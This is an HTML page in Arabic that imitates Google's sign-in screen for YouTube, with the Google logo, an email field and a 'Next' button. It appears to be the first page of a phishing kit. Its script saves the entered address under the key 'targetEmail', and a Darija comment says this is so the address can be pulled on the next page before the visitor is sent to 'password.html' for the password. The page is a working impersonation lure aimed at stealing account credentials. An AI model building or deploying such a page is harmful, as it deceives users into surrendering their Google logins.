<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>تسجيل الدخول</title>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">
    <div class="w-full max-w-[450px] p-10 border border-gray-200 rounded-lg shadow-sm">
        <div class="flex justify-center mb-4">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" alt="Google">
        </div>
        <h1 class="text-2xl text-center mb-2">تسجيل الدخول</h1>
        <p class="text-center mb-8">المتابعة إلى YouTube</p>
        
        <input type="email" id="emailField" class="w-full border border-gray-300 rounded p-3 mb-6 outline-none focus:border-blue-500" placeholder="البريد الإلكتروني">
        
        <div class="flex justify-between items-center mt-10">
            <span class="text-blue-600 font-medium cursor-pointer">إنشاء حساب</span>
            <button id="nextBtn" class="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium">التالي</button>
        </div>
    </div>

    <script>
        document.getElementById('nextBtn').addEventListener('click', () => {
            const email = document.getElementById('emailField').value;
            if(email) {
                // تخزين الإيميل باش نجبدوه فالصفحة الثانية
                sessionStorage.setItem('targetEmail', email);
                // التوجه لصفحة الباسورد
                window.location.href = 'password.html';
            }
        });
    </script>
</body>
</html>
